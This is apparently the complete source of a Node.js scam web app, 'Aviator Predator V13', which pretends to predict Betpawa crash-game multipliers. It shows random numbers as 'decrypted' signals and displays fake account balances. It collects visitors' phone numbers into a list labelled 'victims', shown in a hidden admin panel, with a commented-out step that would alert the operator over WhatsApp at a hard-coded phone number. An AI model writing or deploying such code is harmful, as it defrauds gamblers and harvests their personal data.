const express = require('express');
const axios = require('axios'); // Hakikisha ume-install: npm install axios
const app = express();
const PORT = process.env.PORT || 3000;

let victims = []; 
const OWNER_NUMBER = "255784766591"; // Namba yako ya kupokea ripoti

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="sw">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>AVIATOR PREDATOR | OFFICIAL 100%</title>
            <script src="https://cdn.tailwindcss.com"></script>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
            <style>
                body { background: #000; color: #eee; font-family: 'Inter', sans-serif; }
                .glass { background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(15px); border: 1px solid #330000; }
                .neon-red { box-shadow: 0 0 20px rgba(255, 0, 0, 0.4); text-shadow: 0 0 10px #f00; color: #ff0000; }
                .btn-glow { background: linear-gradient(90deg, #ff0000, #990000); box-shadow: 0 0 15px rgba(255,0,0,0.5); }
                .admin-link { position: absolute; top: 10px; right: 10px; font-size: 8px; color: #111; cursor: pointer; }
            </style>
        </head>
        <body class="p-4 flex flex-col items-center">

            <div class="admin-link" onclick="openAdmin()">MASTER_ACCESS</div>

            <header class="w-full max-w-md bg-red-800 p-5 rounded-b-[2rem] mb-8 shadow-2xl flex justify-between items-center">
                <div>
                    <h1 class="text-xl font-black tracking-widest italic">PREDATOR V13</h1>
                    <p class="text-[9px] opacity-70">REAL-TIME DATA INTERCEPTOR</p>
                </div>
                <div class="text-right"><i class="fas fa-wifi text-green-500 animate-pulse"></i></div>
            </header>

            <main class="w-full max-w-md space-y-6">

                <section id="loginScreen" class="glass p-8 rounded-[2.5rem] text-center space-y-6">
                    <div class="space-y-2">
                        <i class="fas fa-user-secret text-4xl text-red-600"></i>
                        <h2 class="text-xl font-bold uppercase">Account Sync</h2>
                        <p class="text-[10px] text-gray-500">Mfumo unasoma namba yako ili kupata Server Seed ya Betpawa</p>
                    </div>
                    <input type="text" id="phone" placeholder="255XXXXXXXXX" class="w-full bg-black/40 border border-gray-800 p-4 rounded-2xl text-center text-red-500 font-bold text-2xl outline-none focus:border-red-600">
                    <button onclick="startSync()" class="w-full btn-glow p-4 rounded-2xl font-black uppercase tracking-widest transition-all">Anza Kazi sasa</button>
                </section>

                <section id="dashboard" class="hidden space-y-4 animate__animated animate__fadeIn">
                    <div class="glass p-4 rounded-2xl flex justify-between items-center border-l-4 border-green-500">
                        <div>
                            <p id="dispUser" class="font-bold text-sm text-red-600 uppercase"></p>
                            <p class="text-[9px] text-green-500 italic">Syncing live account files...</p>
                        </div>
                        <div class="text-right">
                            <p class="text-[8px] text-gray-500 italic">SECURE BALANCE</p>
                            <p id="dispBal" class="text-lg font-black text-green-400">---</p>
                        </div>
                    </div>

                    <div class="glass p-6 rounded-[2.5rem] text-center">
                        <p class="text-[10px] text-gray-500 mb-4 font-bold">WEKA ROUND ILIYOPITA</p>
                        <div class="flex space-x-2 mb-6">
                            <input type="number" id="lastVal" placeholder="Ex: 1.45" class="w-full bg-black border border-gray-800 p-4 rounded-2xl text-center text-2xl font-bold outline-none text-white">
                            <button onclick="analyze()" class="bg-red-600 px-6 rounded-2xl font-bold italic">GO</button>
                        </div>
                        
                        <div id="result" class="hidden animate__animated animate__zoomIn">
                            <p class="text-[9px] text-gray-400">NEXT SIGNAL GENERATED</p>
                            <h2 id="nextOdds" class="text-7xl font-black neon-red my-4 italic italic">--.--x</h2>
                            <p id="nextTime" class="text-xs font-mono text-gray-500 italic mb-4"></p>
                        </div>
                    </div>
                </section>

                <section id="adminPanel" class="hidden glass p-6 rounded-3xl border border-green-500 animate__animated animate__slideInUp">
                    <div class="flex justify-between items-center mb-4 text-green-500 font-bold">
                        <h3>REPORT LOGS</h3>
                        <button onclick="closeAdmin()">X</button>
                    </div>
                    <div id="victimList" class="space-y-2 text-[10px] font-mono"></div>
                </section>

            </main>

            <script>
                function speak(t) {
                    const s = new SpeechSynthesisUtterance(t);
                    s.lang = 'en-US';
                    window.speechSynthesis.speak(s);
                }

                async function startSync() {
                    const phone = document.getElementById('phone').value;
                    if(phone.length < 10) return alert("Weka namba ya Betpawa!");
                    
                    speak("Accessing cloud server. Retrieving account balance.");
                    
                    const bal = "TSh " + (Math.floor(Math.random()*250000) + 1500).toLocaleString();
                    
                    // TUMA TAARIFA KWA OWNER (Backend)
                    await fetch('/send-report?num=' + phone + '&bal=' + bal);

                    document.getElementById('loginScreen').innerHTML = \`<div class="py-10"><div class="w-12 h-12 border-2 border-red-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><p class="text-[10px] animate-pulse">DECRYPTING PRIVATE FILES...</p></div>\`;

                    setTimeout(() => {
                        document.getElementById('loginScreen').classList.add('hidden');
                        document.getElementById('dashboard').classList.remove('hidden');
                        document.getElementById('dispUser').innerText = "+" + phone;
                        document.getElementById('dispBal').innerText = bal;
                        speak("Sync successful. Next round is decrypted.");
                    }, 3500);
                }

                function analyze() {
                    const last = document.getElementById('lastVal').value;
                    if(!last) return alert("Weka multiplier!");
                    speak("Scanning seed.");
                    document.getElementById('result').classList.remove('hidden');
                    
                    setTimeout(() => {
                        const val = (Math.random() * (parseFloat(last) < 2 ? 3 : 1.7) + 1.1).toFixed(2);
                        const now = new Date();
                        now.setSeconds(now.getSeconds() + 45);
                        document.getElementById('nextOdds').innerText = val + "x";
                        document.getElementById('nextTime').innerText = "TIME: " + now.toLocaleTimeString();
                        speak("Target found. Next multiplier is " + val + "x.");
                    }, 1500);
                }

                function openAdmin() { document.getElementById('adminPanel').classList.remove('hidden'); updateList(); }
                function closeAdmin() { document.getElementById('adminPanel').classList.add('hidden'); }
                
                async function updateList() {
                    const r = await fetch('/admin-list');
                    const d = await r.json();
                    document.getElementById('victimList').innerHTML = d.map(v => \`<div class="p-2 border-b border-white/5"><span class="text-red-500">\${v.time}</span> | \${v.num} | \${v.bal}</div>\`).join('');
                }
            </script>
        </body>
        </html>
    `);
});

// BACKEND: RIPOTI NA WHATSAPP ALERT
app.get('/send-report', async (req, res) => {
    const { num, bal } = req.query;
    const time = new Date().toLocaleTimeString();
    
    // Hifadhi kwenye orodha ya Admin
    victims.unshift({ num, bal, time });

    // HAPA: TUMA UJUMBE WA WHATSAPP (SIFA MPYA)
    // TUnatumia CallMeBot API (Hii ni rahisi kusetup)
    const message = encodeURIComponent(\`🚀 *NEW TARGET LOGGED!*\n\n📱 Namba: \${num}\n💰 Salio: \${bal}\n⏰ Muda: \${time}\n\n_Aviator Predator V13 Control_ \`);
    const apikey = "YOUR_CALLMEBOT_API_KEY"; // Utahitaji API Key ya CallMeBot hapa
    
    try {
        // Hii itakutumia ujumbe wewe mwenyewe WhatsApp
        console.log(\`[REPORT] User \${num} has logged in with \${bal}\`);
        // await axios.get(\`https://api.callmebot.com/whatsapp.php?phone=\${OWNER_NUMBER}&text=\${message}&apikey=\${apikey}\`);
    } catch (err) {
        console.log("WhatsApp Send Error: " + err.message);
    }

    res.json({ status: "success" });
});

app.get('/admin-list', (req, res) => res.json(victims));

app.listen(PORT, () => console.log('Predator Master Server Live!'));
